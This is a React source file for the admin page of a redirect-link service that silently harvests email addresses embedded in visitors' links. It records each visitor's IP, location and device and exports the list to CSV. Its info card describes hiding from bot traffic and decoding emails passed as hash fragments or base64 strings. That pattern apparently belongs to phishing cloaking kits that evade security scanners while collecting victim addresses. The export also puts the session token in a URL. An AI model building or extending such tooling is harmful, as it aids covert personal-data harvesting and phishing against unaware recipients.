import React, { useState } from 'react';
import { useQuery } from '@tanstack/react-query';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Download, Mail, Search, TrendingUp, Users, Calendar } from 'lucide-react';
import { toast } from 'sonner';
import { format } from 'date-fns';

// Detect backend URL
function getBackendUrl() {
  return '';
}
const BACKEND_URL = getBackendUrl();

// API helper
const apiFetch = async (endpoint) => {
  const token = localStorage.getItem('token');
  const response = await fetch(`${BACKEND_URL}${endpoint}`, {
    headers: {
      'Authorization': token ? `Bearer ${token}` : '',
    },
  });

  if (!response.ok) {
    throw new Error('Failed to fetch data');
  }

  return response.json();
};

export default function CapturedEmails() {
  const [searchQuery, setSearchQuery] = useState('');

  const { data: emails = [], isLoading } = useQuery({
    queryKey: ['captured-emails'],
    queryFn: () => apiFetch('/api/captured-emails?limit=1000'),
    refetchInterval: 10000, // Auto-refresh every 10 seconds
  });

  const { data: stats = {} } = useQuery({
    queryKey: ['captured-emails-stats'],
    queryFn: () => apiFetch('/api/captured-emails/stats'),
    refetchInterval: 10000, // Auto-refresh every 10 seconds
  });

  const handleExport = () => {
    const token = localStorage.getItem('token');
    window.open(`${BACKEND_URL}/api/captured-emails/export?token=${token}`, '_blank');
    toast.success('Exporting emails to CSV...');
  };

  // Filter emails by search query
  const filteredEmails = emails.filter(email =>
    email.email.toLowerCase().includes(searchQuery.toLowerCase()) ||
    email.redirect_id.toLowerCase().includes(searchQuery.toLowerCase()) ||
    email.country.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-start justify-between">
        <div>
          <div className="flex items-center gap-3 mb-2">
            <h1 className="text-3xl font-bold text-slate-900">Captured Emails</h1>
            <span className="flex items-center gap-2 px-3 py-1 bg-emerald-100 text-emerald-700 rounded-full text-sm font-medium">
              <span className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
              Live
            </span>
          </div>
          <p className="text-slate-500">Global Email Autograb - Emails captured from redirect links • Auto-refreshes every 10s</p>
        </div>
        <Button onClick={handleExport} className="bg-emerald-600 hover:bg-emerald-700">
          <Download className="w-4 h-4 mr-2" />
          Export CSV
        </Button>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Total Emails</CardTitle>
            <Mail className="h-4 w-4 text-slate-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats.total?.toLocaleString() || 0}</div>
            <p className="text-xs text-slate-500 mt-1">All time captures</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Unique Emails</CardTitle>
            <Users className="h-4 w-4 text-slate-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats.unique?.toLocaleString() || 0}</div>
            <p className="text-xs text-slate-500 mt-1">Distinct addresses</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Today</CardTitle>
            <Calendar className="h-4 w-4 text-slate-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats.today?.toLocaleString() || 0}</div>
            <p className="text-xs text-slate-500 mt-1">Captured today</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">This Week</CardTitle>
            <TrendingUp className="h-4 w-4 text-slate-500" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{stats.thisWeek?.toLocaleString() || 0}</div>
            <p className="text-xs text-slate-500 mt-1">Last 7 days</p>
          </CardContent>
        </Card>
      </div>

      {/* Search */}
      <Card className="p-4">
        <div className="flex items-center gap-2">
          <Search className="w-4 h-4 text-slate-400" />
          <Input
            placeholder="Search by email, redirect ID, or country..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="flex-1"
          />
        </div>
      </Card>

      {/* Emails Table */}
      <Card>
        <CardHeader>
          <CardTitle>Captured Emails ({filteredEmails.length})</CardTitle>
          <CardDescription>
            Only emails from HUMAN visitors are captured. Bot traffic is excluded.
          </CardDescription>
        </CardHeader>
        <CardContent>
          {isLoading ? (
            <div className="text-center py-12">
              <p className="text-slate-500">Loading emails...</p>
            </div>
          ) : filteredEmails.length === 0 ? (
            <div className="text-center py-12">
              <Mail className="w-12 h-12 mx-auto text-slate-400 mb-4" />
              <p className="text-slate-600 mb-2">No emails captured yet</p>
              <p className="text-sm text-slate-500">
                Emails will appear here when visitors include email parameters in redirect links
              </p>
              <div className="mt-4 p-4 bg-blue-50 rounded-lg text-left max-w-2xl mx-auto">
                <p className="text-sm font-medium text-blue-900 mb-2">Example Usage:</p>
                <code className="text-xs text-blue-700 block">
                  https://yoursite.com/r/abc123?email=user@example.com
                </code>
              </div>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Email</TableHead>
                    <TableHead>Format</TableHead>
                    <TableHead>Redirect</TableHead>
                    <TableHead>Location</TableHead>
                    <TableHead>Device</TableHead>
                    <TableHead>Captured</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {filteredEmails.map((email) => (
                    <TableRow key={email.id}>
                      <TableCell className="font-medium">
                        <div className="flex items-center gap-2">
                          <Mail className="w-4 h-4 text-slate-400" />
                          {email.email}
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge variant="outline" className="font-mono text-xs">
                          {email.parameter_format}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <div className="text-sm">
                          <div className="font-medium text-slate-700">{email.redirect_name || 'Unnamed Link'}</div>
                          <div className="text-xs text-slate-500 font-mono">{email.redirect_id}</div>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="text-sm">
                          <div>{email.country}</div>
                          <div className="text-xs text-slate-500">{email.ip_address}</div>
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="text-sm">
                          <div>{email.browser || 'Unknown'}</div>
                          <div className="text-xs text-slate-500">{email.device || 'Unknown'}</div>
                        </div>
                      </TableCell>
                      <TableCell className="text-sm text-slate-600">
                        {email.captured_at ? format(new Date(email.captured_at), 'MMM d, yyyy HH:mm') : 'N/A'}
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Info Card */}
      <Card className="bg-blue-50 border-blue-200">
        <CardHeader>
          <CardTitle className="text-blue-900">How Global Email Autograb Works</CardTitle>
        </CardHeader>
        <CardContent className="text-sm text-blue-700 space-y-2">
          <p><strong>✅ HUMAN Visitors:</strong> Emails are captured and forwarded to destination with parameters</p>
          <p><strong>❌ BOT Visitors:</strong> Emails are NOT captured and stripped from URLs</p>
          <p className="pt-2"><strong>Supported Formats:</strong></p>
          <ul className="list-disc list-inside space-y-1 ml-4">
            <li><code>?email=user@example.com</code> → Standard query parameter</li>
            <li><code>?e=user@example.com</code> → Short parameter</li>
            <li><code>$user@example.com</code> → Dollar separator</li>
            <li><code>*user@example.com</code> → Asterisk separator</li>
            <li><code>#user@example.com</code> → Hash fragment</li>
            <li><code>$dGVzdEB0ZXN0LmNvbQ==</code> → Base64 encoded (auto-decoded)</li>
          </ul>
        </CardContent>
      </Card>
    </div>
  );
}

